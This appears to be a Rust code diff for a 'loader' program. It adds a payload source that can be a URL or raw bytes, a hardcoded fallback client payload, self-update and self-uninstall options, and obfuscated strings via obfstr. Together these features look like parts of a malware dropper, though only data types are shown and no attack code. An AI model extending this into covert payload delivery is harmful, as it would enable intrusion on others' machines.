@@ -1,4 +1,10 @@
 use serde::{ Deserialize, Serialize };
+use obfstr::obfstr as s;
+use crate::constants::{
+    hardcoded_client_fallback_source,
+    hardcoded_client_version,
+    loader_version,
+};
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct LoaderReceivePayload {
@@ -18,17 +24,33 @@ pub enum ClientParams {
     UninstallSelf(UninstallSelfParams),
     UpdateSelf(UpdateSelfParams),
 }
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub enum FileSource {
+    Url(String),
+    Bytes(Vec<u8>),
+}
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct RunConfigParams {
     pub enabled: bool, // if disabled not even run
-    pub client_bytes: Option<Vec<u8>>,
-    pub client_url: Option<String>,
+    pub client_source: Option<FileSource>,
     pub client_version: u64,
-    pub self_bytes: Option<Vec<u8>>,
-    pub self_url: Option<String>,
+    pub self_source: Option<FileSource>,
     pub self_version_latest: u64,
     pub update_enabled: bool, // reinstall updated if version higher
+}
+
+impl Default for RunConfigParams {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            client_source: hardcoded_client_fallback_source(),
+            client_version: hardcoded_client_version(),
+            self_source: None,
+            self_version_latest: loader_version(),
+            update_enabled: false,
+        }
+    }
 }
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct UninstallSelfParams {}
